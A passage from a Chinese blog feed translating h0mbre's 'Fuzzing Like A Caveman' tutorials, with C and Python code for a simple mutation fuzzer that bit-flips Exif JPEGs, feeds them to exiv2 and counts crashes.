Exit Status</h3><p>在完成<code>C</code>的翻译后，我去推特询问了有关性能改进的建议，<a href="https://twitter.com/lcamtuf">@lcamtuf</a>，<code>AFL</code>的创建者，向我解释说，我不应该在我的代码中用<code>popen</code>，因为它会生成一个<code>shell</code>并且性能很差，这是我寻求帮助的代码片段：</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">exif</span><span class="hljs-params">(<span class="hljs-keyword">int</span> iteration)</span> </span>&#123;        FILE *fileptr;        <span class="hljs-comment">//fileptr = popen(&quot;exif_bin target.jpeg -verbose &gt;/dev/null 2&gt;&amp;1&quot;, &quot;r&quot;);</span>    fileptr = popen(<span class="hljs-string">&quot;exiv2 pr -v mutated.jpeg &gt;/dev/null 2&gt;&amp;1&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);    <span class="hljs-keyword">int</span> status = WEXITSTATUS(pclose(fileptr));    <span class="hljs-keyword">switch</span>(status) &#123;        <span class="hljs-keyword">case</span> <span class="hljs-number">253</span>:            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">default</span>:            crashes++;            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\r[&gt;] Crashes: %d&quot;</span>, crashes);            fflush(<span class="hljs-built_in">stdout</span>);            <span class="hljs-keyword">char</span> command[<span class="hljs-number">50</span>];            <span class="hljs-built_in">sprintf</span>(command, <span class="hljs-string">&quot;cp mutated.jpeg ccrashes/crash.%d.%d&quot;</span>,             iteration,status);            system(command);            <span class="hljs-keyword">break</span>;    &#125;&#125;</code></pre><p>正如你所看到的，我们使用<code>popen()</code>，运行一个<code>shell-command</code>，然后关闭子进程的文件指针，返回用<code>WEXITSTATUS</code>宏监控的<code>exit-status</code>，我正在过滤掉一些我不关心的<code>exit codes</code>，如253、0和1，并希望看到一些与我们已经用<code>C++ fuzzer</code>发现的<code>floating point errors</code>有关的代码，或甚至可能是一个<code>segfault</code>，<code>@lcamtuf</code>建议我不使用<code>popen()</code>，而是调用<code>fork()</code>来生成一个子进程，<code>execvp()</code>让子进程执行一个命令，最后使用<code>waitpid()</code>来等待子进程终止并返回退出状态。</p><p>由于我们在这个<code>syscall</code>路径中没有一个合适的<code>shell</code>，我不得不同时打开一个<code>/dev/null</code>的句柄，并调用<code>dup2()</code>路由<code>stdout</code>和<code>stderr</code>到<code>/dev/null</code>，因为我们并不关心命令输出，我还使用了<code>WTERMSIG</code>宏来检索在<code>WIFSIGNALED</code>宏返回真时终止子进程的信号，这将表明我们得到了一个<code>segfault</code>或<code>floating point exception</code>，等等，所以现在，我们更新的函数看起来像这样：</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">exif</span><span class="hljs-params">(<span class="hljs-keyword">int</span> iteration)</span> </span>&#123;        <span class="hljs-keyword">char</span>* file = <span class="hljs-string">&quot;exiv2&quot;</span>;    <span class="hljs-keyword">char</span>* argv[<span class="hljs-number">4</span>];    argv[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;pr&quot;</span>;    argv[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-v&quot;</span>;    argv[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;mutated.jpeg&quot;</span>;    argv[<span class="hljs-number">3</span>] = <span class="hljs-literal">NULL</span>;    <span class="hljs-keyword">pid_t</span> child_pid;    <span class="hljs-keyword">int</span> child_status;    child_pid = fork();    <span class="hljs-keyword">if</span> (child_pid == <span class="hljs-number">0</span>) &#123;        <span class="hljs-comment">// this means we&#x27;re the child process</span>        <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_WRONLY);        <span class="hljs-comment">// dup both stdout and stderr and send them to /dev/null</span>        dup2(fd, <span class="hljs-number">1</span>);        dup2(fd, <span class="hljs-number">2</span>);        close(fd);        execvp(file, argv);        <span class="hljs-comment">// shouldn&#x27;t return, if it does, we have an error with the command</span>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Unknown command for execvp, exiting...\n&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);    &#125;    <span class="hljs-keyword">else</span> &#123;        <span class="hljs-comment">// this is run by the parent process</span>        <span class="hljs-keyword">do</span> &#123;            <span class="hljs-keyword">pid_t</span> tpid = waitpid(child_pid, &amp;child_status, WUNTRACED |             WCONTINUED);            <span class="hljs-keyword">if</span> (tpid == <span class="hljs-number">-1</span>) &#123;                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Waitpid failed!\n&quot;</span>);                perror(<span class="hljs-string">&quot;waitpid&quot;</span>);            &#125;            <span class="hljs-keyword">if</span> (WIFEXITED(child_status)) &#123;                <span class="hljs-comment">//printf(&quot;WIFEXITED: Exit Status: %d\n&quot;, WEXITSTATUS(child_status));</span>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WIFSIGNALED(child_status)) &#123;                crashes++;                <span class="hljs-keyword">int</span> exit_status = WTERMSIG(child_status);                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\r[&gt;] Crashes: %d&quot;</span>, crashes);                fflush(<span class="hljs-built_in">stdout</span>);                <span class="hljs-keyword">char</span> command[<span class="hljs-number">50</span>];                <span class="hljs-built_in">sprintf</span>(command, <span class="hljs-string">&quot;cp mutated.jpeg ccrashes/%d.%d&quot;</span>, iteration,                 exit_status);                system(command);            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WIFSTOPPED(child_status)) &#123;                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WIFSTOPPED: Exit Status: %d\n&quot;</span>, WSTOPSIG(child_status));            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WIFCONTINUED(child_status)) &#123;                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WIFCONTINUED: Exit Status: Continued.\n&quot;</span>);            &#125;        &#125; <span class="hljs-keyword">while</span> (!WIFEXITED(child_status) &amp;&amp; !WIFSIGNALED(child_status));    &#125;&#125;</code></pre><p>你可以看到，这极大地提高了我们<code>200k</code>次迭代基准测试的性能：</p><pre><code class="hljs apache"><span class="hljs-attribute">h0mbre</span>:~$ time ./cfuzz<span class="hljs-number">2</span> Canon_<span class="hljs-number">40</span>D.jpg <span class="hljs-number">200000</span><span class="hljs-section">&lt;snipped_results&gt;</span><span class="hljs-attribute">real</span>    <span class="hljs-number">8</span>m<span class="hljs-number">30</span>.<span class="hljs-number">371</span>s<span class="hljs-attribute">user</span>    <span class="hljs-number">6</span>m<span class="hljs-number">10</span>.<span class="hljs-number">219</span>s<span class="hljs-attribute">sys</span>     <span class="hljs-number">2</span>m<span class="hljs-number">2</span>.<span class="hljs-number">098</span>s</code></pre><h3 id="Summary-of-Results"><a href="#Summary-of-Results" class="headerlink" title="Summary of Results"></a>Summary of Results</h3><ul><li>C++ Fuzzer – 310 iterations/sec</li><li>C Fuzzer – 329 iterations/sec (+ 6%)</li><li>C Fuzzer 2.0 – 392 iterations/sec (+ 26%)</li></ul><p>感谢<a href="https://twitter.com/lcamtuf">@lcamtuf</a>和<a href="https://twitter.com/carste1n">@carste1n</a>的帮助</p><p>我已经把代码上传到<code>https://github.com/h0mbre/Fuzzing/tree/master/JPEGMutation</code></p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing Like A Caveman 译</title>
    <link href="/2022/04/28/fuzzing%20like%20a%20caveman/"/>
    <url>/2022/04/28/fuzzing%20like%20a%20caveman/</url>
    
    <content type="html"><![CDATA[<p>原文为 <a href="https://h0mbre.github.io/Fuzzing-Like-A-Caveman">Fuzzing-Like-A-Caveman</a>，本文章仅为个人理解的翻译和备份</p><h2 id="Intoduction"><a href="#Intoduction" class="headerlink" title="Intoduction"></a>Intoduction</h2><p>在过去的几个月里，我一直在被动地消化大量与模糊测试相关的材料，因为我主要尝试将我的<code>Windows exploitation game</code>从<code>Noob-level</code>提高到<code>1%-Less-Noob-Level</code>，而且我发现它相当的迷人，在这篇文章中，我将向你们展示如何创建一个非常简单变异的<code>fuzzer</code>，希望我们可以利用这个<code>fuzzer</code>在一些开源项目中找到一些<code>crashes</code>。</p><p>我们将创建的这个<code>fuzzer</code>是跟随着 <a href="https://twitter.com/gynvael?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor">@gynvael’s fuzzing tutorial on YouTube</a>实现的，我不知道<code>Gynvael</code>有视频，所以现在我有几十个小时的内容可以添加到无止尽的<code>watch/read</code>列表中。</p><p>我也必须要说<a href="https://www.youtube.com/user/gamozolabs/videos">Brandon Faulk’s fuzzing streams</a>是非常好的，虽然我不能理解近乎<code>99%</code>的<code>Brandon says</code>所说的事情，但是这些视频的内容是吸引人的，到目前为止，我个人最喜欢的是他对<code>calc.exe</code>和<code>c-tags</code>的<code>fuzzing</code>，他也有一个关于<code>fuzzing</code>概念特别好的介绍的视频：<a href="https://www.youtube.com/watch?v=SngK4W4tVc0">NYU Fuzzing Talk</a></p><h2 id="Picking-a-Target"><a href="#Picking-a-Target" class="headerlink" title="Picking a Target"></a>Picking a Target</h2><p>我想找一个用<code>C</code>或者<code>C++</code>写的从文件中解析数据的<code>binary</code>，我最先找到的其中一个就是从<code>images</code>中解析<code>Exif</code>数据的<code>binaries</code>，我们也想选一个几乎没有安全隐患的目标，因为我们将会实时的公布这些发现。</p><p>从<a href="https://www.media.mit.edu/pia/Research/deepview/exif.html">exif</a>可知，基本上，<code>Exif</code>文件格式是跟<code>JPEG</code>文件格式是相同的，<code>Exif</code>插入一些<code>image/digicam</code>信息数据和缩略图 (<code>thumbnail image</code>) 到<code>JPEG</code>中以符合<code>JPEG</code>的规范，因此你可以通过<code>JEPG</code>兼容的浏览器/图片查看器/图片修饰软件等查看<code>Exif</code>格式的文件，就像通常查看<code>JPEG</code>文件一样。</p><p>因此，<code>Exif</code>可将元数据类型插入到符合<code>JPEG</code>规范的文件中，并且市面上存在不少有助于解析这些数据的<code>programs/utilities</code>。</p><h2 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h2><p>我们将用<code>Python3</code>去构建一个初级的变异的<code>fuzzer</code>，巧妙地（或者不那么巧妙地）改变合规的<code>Exif-filled</code>的<code>JPEGs</code>，并将它们喂给解析器希望能得到<code>crash</code>，我们还将开发<code>x86 Kali Linux</code>发行版。</p><p>首先，我们需要一个合规的<code>Exif-filled</code>的<code>JPEG</code>，谷歌搜素<code>Sample JPEG with Exif</code>就有助于我们找到这个<a href="https://github.com/ianare/exif-samples/tree/master/jpg">repo</a>，我将会用<code>Canon_40D.jpg</code>用于测试。</p><h2 id="Getting-to-Know-the-JPEG-and-EXIF-Spec"><a href="#Getting-to-Know-the-JPEG-and-EXIF-Spec" class="headerlink" title="Getting to Know the JPEG and EXIF Spec"></a>Getting to Know the JPEG and EXIF Spec</h2><p>在我们将<code>Python</code>写入<code>Sublime Text</code>之前，让我们首先花一点来了解<code>JPEG</code>和<code>Exif</code>规范，一遍我们可以避免一些更明显的损坏图像，以至于解析器不会试图解析它以浪费宝贵的<code>fuzzing cycles</code>。</p><p>从前文提到的<a href="https://www.media.mit.edu/pia/Research/deepview/exif.html">规范概述</a>可知所有的<code>JPEG</code>图片都是以<code>0xFFD8</code>开头，以<code>0xFFD9</code>结尾，这前几个字节就是所谓的<code>magic bytes</code>，在<code>*Nix system</code>中通过<code>magic bytes</code>可以直接识别出文件类型。</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~# file Canon_40D.jpg Canon_40D.jpg: JPEG image data, JFIF standard <span class="hljs-number">1.01</span>, resolution (DPI), density <span class="hljs-number">72</span>x72, segment length <span class="hljs-number">16</span>, Exif Standard: [TIFF image data, little-endian, direntries=<span class="hljs-number">11</span>, manufacturer=Canon, model=Canon EOS <span class="hljs-number">40</span>D, orientation=upper-left, xresolution=<span class="hljs-number">166</span>, yresolution=<span class="hljs-number">174</span>, resolutionunit=<span class="hljs-number">2</span>, software=GIMP <span class="hljs-number">2.4</span><span class="hljs-number">.5</span>, datetime=<span class="hljs-number">2008</span>:<span class="hljs-number">07</span>:<span class="hljs-number">31</span> <span class="hljs-number">10</span>:<span class="hljs-number">38</span>:<span class="hljs-number">11</span>, GPS-Data], baseline, precision <span class="hljs-number">8</span>, <span class="hljs-number">100</span>x68, components <span class="hljs-number">3</span></code></pre><p>我们可以去掉<code>.jpg</code>并获得相同的输出</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~# file CanonCanon: JPEG image data, JFIF standard <span class="hljs-number">1.01</span>, resolution (DPI), density <span class="hljs-number">72</span>x72, segment length <span class="hljs-number">16</span>, Exif Standard: [TIFF image data, little-endian, direntries=<span class="hljs-number">11</span>, manufacturer=Canon, model=Canon EOS <span class="hljs-number">40</span>D, orientation=upper-left, xresolution=<span class="hljs-number">166</span>, yresolution=<span class="hljs-number">174</span>, resolutionunit=<span class="hljs-number">2</span>, software=GIMP <span class="hljs-number">2.4</span><span class="hljs-number">.5</span>, datetime=<span class="hljs-number">2008</span>:<span class="hljs-number">07</span>:<span class="hljs-number">31</span> <span class="hljs-number">10</span>:<span class="hljs-number">38</span>:<span class="hljs-number">11</span>, GPS-Data], baseline, precision <span class="hljs-number">8</span>, <span class="hljs-number">100</span>x68, components <span class="hljs-number">3</span></code></pre><p>如果我们 <code>hexdump</code> 这个图片，我们可以看到最初的几个字节和最后的几个字节实际上就是<code>0xFFD8</code>和<code>0xFFD9</code></p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~# hexdump Canon<span class="hljs-number">0000000</span> d8ff e0ff <span class="hljs-number">1000</span> <span class="hljs-number">464</span>a <span class="hljs-number">4649</span> <span class="hljs-number">0100</span> <span class="hljs-number">0101</span> <span class="hljs-number">4800</span>------SNIP------<span class="hljs-number">0001f</span>10 <span class="hljs-number">5</span>aed <span class="hljs-number">5158</span> d9ff</code></pre><p>在规范概述中另外一个有趣的信息是<code>markers</code>是以<code>0xFF</code>开头的，有几种一直的静态标记 (<code>marders</code>) 例如：</p><ul><li>the ‘Start of Image’(SOI) marker: 0xFFD8</li><li>APP1 marker: 0xFFE1</li><li>generic markers: 0xFFXX</li><li>the ‘End of Image’(EOI) marker: 0xFFD9</li></ul><p>因为我们不像去改变<code>image</code>的长度或者文件的类型，所以让我们继续并计划尽可能保持<code>SOI</code>和<code>EOI</code>标记完整，我们并不想插入<code>0xFFD9</code>到图像中间，以至于这会截断图像或者导致解析器以<code>non-crashy way</code>而产生混乱（<code>Non-crashy</code>并不是一个真实的词），这也可能会被误导也许我们也应该在字节流中随机放置<code>EOI</code>标记？来我们试试看。</p><h2 id="Starting-Our-Fuzzer"><a href="#Starting-Our-Fuzzer" class="headerlink" title="Starting Our Fuzzer"></a>Starting Our Fuzzer</h2><p>这我们将做的第一件事情就是提取<code>JPEG</code>中的所有字节，我们希望将其用作我们的<code>valid</code>输入蓝本，当然我们会对其进行变异。</p><p>我们的代码将会从写成这样开始：</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><span class="hljs-keyword">import</span> sys<span class="hljs-comment"># read bytes from our valid JPEG and return them in a mutable bytearray </span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_bytes</span>(<span class="hljs-params">filename</span>):</span>    f = open(filename, <span class="hljs-string">&quot;rb&quot;</span>).read()    <span class="hljs-keyword">return</span> bytearray(f)<span class="hljs-keyword">if</span> len(sys.argv) &lt; <span class="hljs-number">2</span>:    print(<span class="hljs-string">&quot;Usage: JPEGfuzz.py &lt;valid_jpg&gt;&quot;</span>)<span class="hljs-keyword">else</span>:    filename = sys.argv[<span class="hljs-number">1</span>]    data = get_bytes(filename)</code></pre><p>如果我们希望看到这个数据是长什么样的，我们可以在数组中打印最初10个左右的字节值，然后看看我们将会如何与其进行交互，我们将仅是临时添加一些类似如下的东西：</p><pre><code class="hljs python"><span class="hljs-keyword">else</span>:    filename = sys.argv[<span class="hljs-number">1</span>]    data = get_bytes(filename)    counter = <span class="hljs-number">0</span>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data:        <span class="hljs-keyword">if</span> counter &lt; <span class="hljs-number">10</span>:            print(x)        counter += <span class="hljs-number">1</span></code></pre><p>运行这个，显示我们正将其转换为整齐的十进制整数，在我看来，这让一切变得更为容易。</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~# python3 fuzzer.py Canon_40D.jpg <span class="hljs-number">255</span><span class="hljs-number">216</span><span class="hljs-number">255</span><span class="hljs-number">224</span><span class="hljs-number">0</span><span class="hljs-number">16</span><span class="hljs-number">74</span><span class="hljs-number">70</span><span class="hljs-number">73</span><span class="hljs-number">70</span></code></pre><p>让我们快速地看看是否可以从我们的字节数组中创建一个新的合规的 <code>JPEG</code>，我们将把这个函数添加到我们的代码中并运行它。</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_new</span>(<span class="hljs-params">data</span>):</span>    f = open(<span class="hljs-string">&quot;mutated.jpg&quot;</span>, <span class="hljs-string">&quot;wb+&quot;</span>)    f.write(data)    f.close()</code></pre><p>所以现在在我们的字典中可以获得一个<code>mutated.jpg</code>，让我们<code>hash</code>比较这两个文件，看它们是否匹配的上.</p><pre><code class="hljs llvm">root<span class="hljs-title">@kali</span>:~# shasum Canon_<span class="hljs-number">40</span>D.jpg mutated.jpg <span class="hljs-keyword">c</span><span class="hljs-number">3</span>d<span class="hljs-number">98686223</span>ad<span class="hljs-number">69</span>ea<span class="hljs-number">29</span><span class="hljs-keyword">c</span><span class="hljs-number">811</span>aaab<span class="hljs-number">35</span>d<span class="hljs-number">343</span>ff<span class="hljs-number">1</span>ae<span class="hljs-number">9</span>e  Canon_<span class="hljs-number">40</span>D.jpg<span class="hljs-keyword">c</span><span class="hljs-number">3</span>d<span class="hljs-number">98686223</span>ad<span class="hljs-number">69</span>ea<span class="hljs-number">29</span><span class="hljs-keyword">c</span><span class="hljs-number">811</span>aaab<span class="hljs-number">35</span>d<span class="hljs-number">343</span>ff<span class="hljs-number">1</span>ae<span class="hljs-number">9</span>e  mutated.jpg</code></pre><p>有趣，我们可以有两个相同的文件，现在我们可以在创建<code>mutated.jpg</code>之前变异数据。</p><h2 id="Mutating"><a href="#Mutating" class="headerlink" title="Mutating"></a>Mutating</h2><p>我们将保持我们的 <code>fuzzer</code> 相对简单，并且只是实现两种不同的变异方式，这些方法如下：</p><ul><li>位翻转（<code>bit flipping</code>）</li><li>用<code>Gynvael&#39;s &#39;Magic Numbers&#39;</code>覆盖字节序列（<code>overwriting byte sequences with Gynvael’s ‘Magic Numbers’</code>）</li></ul><p>让我们开始位翻转吧，<code>255</code>（<code>0xFF</code>）在二进制中将是<code>11111111</code>，如果我们随机翻转这个数字中的一位，假设在<code>index</code>数字为<code>2</code>，我们将得到<code>11011111</code>，这个新数字会是<code>223</code>（<code>0xDF</code>）。</p><p>我不能完全确认这种变异方式和随机选择一个<code>0-255</code>的数字并且重写一个新的数字有着什么区别，我的直觉说位翻转与用任意字节随机覆盖字节非常相似。</p><p>让我们继续，假设我们想去仅翻转<code>1%</code>的比特，我们在<code>Python</code>中通过如下代码得到这个数字。</p><pre><code class="hljs lisp">num_of_flips = int((<span class="hljs-name">len</span>(<span class="hljs-name">data</span>) - <span class="hljs-number">4</span>) * .01)</code></pre><p>我们想从我们的字节数组的长度中减去4，因为我们不想计算在我们的数组中的最初的两个字节或最后连个字节，因为这些是<code>SOI</code>和<code>EOI</code>标记，我们意在保持原样。</p><p>接下来我们将想要随机选择许多的<code>indexes</code>然后将这些<code>indexes</code>作为位翻转的目标，我们将继续创建一组可以修改的可能的<code>indexes</code>，然后选择其中的<code>num_of_flips</code>个进行随机的位翻转。</p><pre><code class="hljs python">indexes = range(<span class="hljs-number">4</span>, (len(data) - <span class="hljs-number">4</span>))chosen_indexes = []<span class="hljs-comment"># iterate selecting indexes until we&#x27;ve hit our num_of_flips number</span>counter = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> counter &lt; num_of_flips:    chosen_indexes.append(random.choice(indexes))    counter += <span class="hljs-number">1</span></code></pre><p>让我们把<code>import random</code>加到我们的<code>script</code>中，并添加这些<code>debug</code>的<code>print</code>状态以确保所有的一切都能成功运转。</p><pre><code class="hljs python">print(<span class="hljs-string">&quot;Number of indexes chosen: &quot;</span> + str(len(chosen_indexes)))print(<span class="hljs-string">&quot;Indexes chosen: &quot;</span> + str(chosen_indexes))</code></pre><p>我们的<code>function</code>现在是像这样：</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bit_flip</span>(<span class="hljs-params">data</span>):</span>    num_of_flips = int((len(data) - <span class="hljs-number">4</span>) * <span class="hljs-number">.01</span>)    indexes = range(<span class="hljs-number">4</span>, (len(data) - <span class="hljs-number">4</span>))    chosen_indexes = []    <span class="hljs-comment"># iterate selecting indexes until we&#x27;ve hit our num_of_flips number</span>    counter = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> counter &lt; num_of_flips:        chosen_indexes.append(random.choice(indexes))        counter += <span class="hljs-number">1</span>    print(<span class="hljs-string">&quot;Number of indexes chosen: &quot;</span> + str(len(chosen_indexes)))    print(<span class="hljs-string">&quot;Indexes chosen: &quot;</span> + str(chosen_indexes))</code></pre><p>如果我们跑这个脚本，我们将会得到一个预期的不错的输出。</p><pre><code class="hljs yaml"><span class="hljs-string">root@kali:~#</span> <span class="hljs-string">python3</span> <span class="hljs-string">fuzzer.py</span> <span class="hljs-string">Canon_40D.jpg</span> <span class="hljs-attr">Number of indexes chosen:</span> <span class="hljs-number">79</span><span class="hljs-attr">Indexes chosen:</span> [<span class="hljs-number">6580</span>, <span class="hljs-number">930</span>, <span class="hljs-number">6849</span>, <span class="hljs-number">6007</span>, <span class="hljs-number">5020</span>, <span class="hljs-number">33</span>, <span class="hljs-number">474</span>, <span class="hljs-number">4051</span>, <span class="hljs-number">7722</span>, <span class="hljs-number">5393</span>, <span class="hljs-number">3540</span>, <span class="hljs-number">54</span>, <span class="hljs-number">5290</span>, <span class="hljs-number">2106</span>, <span class="hljs-number">2544</span>, <span class="hljs-number">1786</span>, <span class="hljs-number">5969</span>, <span class="hljs-number">5211</span>, <span class="hljs-number">2256</span>, <span class="hljs-number">510</span>, <span class="hljs-number">7147</span>, <span class="hljs-number">3370</span>, <span class="hljs-number">625</span>, <span class="hljs-number">5845</span>, <span class="hljs-number">2082</span>, <span class="hljs-number">2451</span>, <span class="hljs-number">7500</span>, <span class="hljs-number">3672</span>, <span class="hljs-number">2736</span>, <span class="hljs-number">2462</span>, <span class="hljs-number">5395</span>, <span class="hljs-number">7942</span>, <span class="hljs-number">2392</span>, <span class="hljs-number">1201</span>, <span class="hljs-number">3274</span>, <span class="hljs-number">7629</span>, <span class="hljs-number">5119</span>, <span class="hljs-number">1977</span>, <span class="hljs-number">2986</span>, <span class="hljs-number">7590</span>, <span class="hljs-number">1633</span>, <span class="hljs-number">4598</span>, <span class="hljs-number">1834</span>, <span class="hljs-number">445</span>, <span class="hljs-number">481</span>, <span class="hljs-number">7823</span>, <span class="hljs-number">7708</span>, <span class="hljs-number">6840</span>, <span class="hljs-number">1596</span>, <span class="hljs-number">5212</span>, <span class="hljs-number">4277</span>, <span class="hljs-number">3894</span>, <span class="hljs-number">2860</span>, <span class="hljs-number">2912</span>, <span class="hljs-number">6755</span>, <span class="hljs-number">3557</span>, <span class="hljs-number">3535</span>, <span class="hljs-number">3745</span>, <span class="hljs-number">1780</span>, <span class="hljs-number">252</span>, <span class="hljs-number">6128</span>, <span class="hljs-number">7187</span>, <span class="hljs-number">500</span>, <span class="hljs-number">1051</span>, <span class="hljs-number">4372</span>, <span class="hljs-number">5138</span>, <span class="hljs-number">3305</span>, <span class="hljs-number">872</span>, <span class="hljs-number">6258</span>, <span class="hljs-number">2136</span>, <span class="hljs-number">3486</span>, <span class="hljs-number">5600</span>, <span class="hljs-number">651</span>, <span class="hljs-number">1624</span>, <span class="hljs-number">4368</span>, <span class="hljs-number">7076</span>, <span class="hljs-number">1802</span>, <span class="hljs-number">2335</span>, <span class="hljs-number">3553</span>]</code></pre><p>接下来我们需要实际变异这些<code>indexes</code>上的字节，我们需要位翻转他们，我选择用一个非常<code>hacky</code>的方式去做这件事，你尽可以随意的实现你自己的方法，我们准备转换这些<code>indexes</code>上的字节到二进制字符串，并将其补齐为8位数长，让我们添加这个代码，看看我们在说些什么，我们将会转换这字节的值（就是转为十进制）到二进制串，并如果它少于8位数长时在其前面填充0，这最后一行就是调试时的临时打印。</p><pre><code class="hljs python"><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> chosen_indexes:    current = data[x]    current = (bin(current).replace(<span class="hljs-string">&quot;0b&quot;</span>,<span class="hljs-string">&quot;&quot;</span>))    current = <span class="hljs-string">&quot;0&quot;</span> * (<span class="hljs-number">8</span> - len(current)) + current</code></pre><p>正如你所示，我们有一个不错的二进制数字作为字符串的输出。</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~# python3 fuzzer.py Canon_40D.jpg <span class="hljs-number">10100110</span><span class="hljs-number">10111110</span><span class="hljs-number">10010010</span><span class="hljs-number">00110000</span><span class="hljs-number">01110001</span><span class="hljs-number">00110101</span><span class="hljs-number">00110010</span>-----SNIP-----</code></pre><p>现在对于其中的每一个，我们将会随机挑选一个<code>index</code>然后翻转它，例如，<code>10100110</code>，如果选择<code>index 0</code>，我们得到是<code>1</code>，我们将会翻转其成为<code>0</code>。</p><p>这段代码段最后的考虑是这些是字符串而不是整数，所以我们需要做的最后一件事情就是将翻转的二进制字符串转换为整数。</p><p>我们将创建一个空白的列表、把每个数字降入这个列表、翻转我们随机挑选的数字，然后从所有的列表成员中构造一个新的字符串（我们必须使用这个中间列表的步骤，因为字符串是可变异的），最后我们将其转换为整数，然后返回数据给我们的<code>create_new()</code>函数以创建一个新的<code>JPEG</code>。</p><p>我们的全部脚本目前是像这样：</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> random<span class="hljs-comment"># read bytes from our valid JPEG and return them in a mutable bytearray </span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_bytes</span>(<span class="hljs-params">filename</span>):</span>    f = open(filename, <span class="hljs-string">&quot;rb&quot;</span>).read()    <span class="hljs-keyword">return</span> bytearray(f)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bit_flip</span>(<span class="hljs-params">data</span>):</span>    num_of_flips = int((len(data) - <span class="hljs-number">4</span>) * <span class="hljs-number">.01</span>)    indexes = range(<span class="hljs-number">4</span>, (len(data) - <span class="hljs-number">4</span>))    chosen_indexes = []    <span class="hljs-comment"># iterate selecting indexes until we&#x27;ve hit our num_of_flips number</span>    counter = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> counter &lt; num_of_flips:        chosen_indexes.append(random.choice(indexes))        counter += <span class="hljs-number">1</span>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> chosen_indexes:        current = data[x]        current = (bin(current).replace(<span class="hljs-string">&quot;0b&quot;</span>,<span class="hljs-string">&quot;&quot;</span>))        current = <span class="hljs-string">&quot;0&quot;</span> * (<span class="hljs-number">8</span> - len(current)) + current                indexes = range(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>)        picked_index = random.choice(indexes)        new_number = []        <span class="hljs-comment"># our new_number list now has all the digits, example: [&#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;]</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> current:            new_number.append(i)        <span class="hljs-comment"># if the number at our randomly selected index is a 1, make it a 0, and vice versa</span>        <span class="hljs-keyword">if</span> new_number[picked_index] == <span class="hljs-string">&quot;1&quot;</span>:            new_number[picked_index] = <span class="hljs-string">&quot;0&quot;</span>        <span class="hljs-keyword">else</span>:            new_number[picked_index] = <span class="hljs-string">&quot;1&quot;</span>        <span class="hljs-comment"># create our new binary string of our bit-flipped number</span>        current = <span class="hljs-string">&#x27;&#x27;</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> new_number:            current += i        <span class="hljs-comment"># convert that string to an integer</span>        current = int(current,<span class="hljs-number">2</span>)        <span class="hljs-comment"># change the number in our byte array to our new number we just constructed</span>        data[x] = current    <span class="hljs-keyword">return</span> data<span class="hljs-comment"># create new jpg with mutated data</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_new</span>(<span class="hljs-params">data</span>):</span>    f = open(<span class="hljs-string">&quot;mutated.jpg&quot;</span>, <span class="hljs-string">&quot;wb+&quot;</span>)    f.write(data)    f.close()<span class="hljs-keyword">if</span> len(sys.argv) &lt; <span class="hljs-number">2</span>:    print(<span class="hljs-string">&quot;Usage: JPEGfuzz.py &lt;valid_jpg&gt;&quot;</span>)<span class="hljs-keyword">else</span>:    filename = sys.argv[<span class="hljs-number">1</span>]    data = get_bytes(filename)    mutated_data = bit_flip(data)    create_new(mutated_data)</code></pre><h2 id="Analyzing-Mutation"><a href="#Analyzing-Mutation" 